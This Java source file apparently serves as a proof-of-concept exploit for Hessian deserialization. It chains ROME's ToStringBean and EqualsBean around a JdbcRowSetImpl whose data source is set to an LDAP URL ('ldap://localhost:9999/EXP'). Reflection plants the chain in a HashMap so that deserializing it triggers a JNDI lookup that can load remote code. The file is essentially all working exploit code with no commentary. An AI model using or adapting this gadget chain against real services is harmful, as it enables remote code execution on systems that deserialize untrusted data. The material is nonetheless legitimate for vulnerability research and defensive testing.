package hessain;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Hessain_JDBCRowSetImpl {

    public static <T> byte[] serialize(T o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        HessianOutput output = new HessianOutput(bao);
        output.writeObject(o);
        System.out.println(bao.toString());
        return bao.toByteArray();
    }

    public static <T> T deserialize(byte[] bytes) throws IOException {
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);
        HessianInput input = new HessianInput(bai);
        Object o = input.readObject();
        return (T) o;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getValue(Object obj, String name) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://localhost:9999/EXP";
        jdbcRowSet.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("aaa", "123");
        Field field = HashMap.class.getDeclaredField("table");
        field.setAccessible(true);
        Object[] array = (Object[]) field.get(hashMap);
        Object node = array[0];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, equalsBean);
        Field valueField = node.getClass().getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(node, "xxxx");

        byte[] bytes = serialize(hashMap);
        System.out.println(bytes);
        System.out.println((HashMap)deserialize(bytes));
    }

    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(s, "table", tbl);
        return s;
    }
}
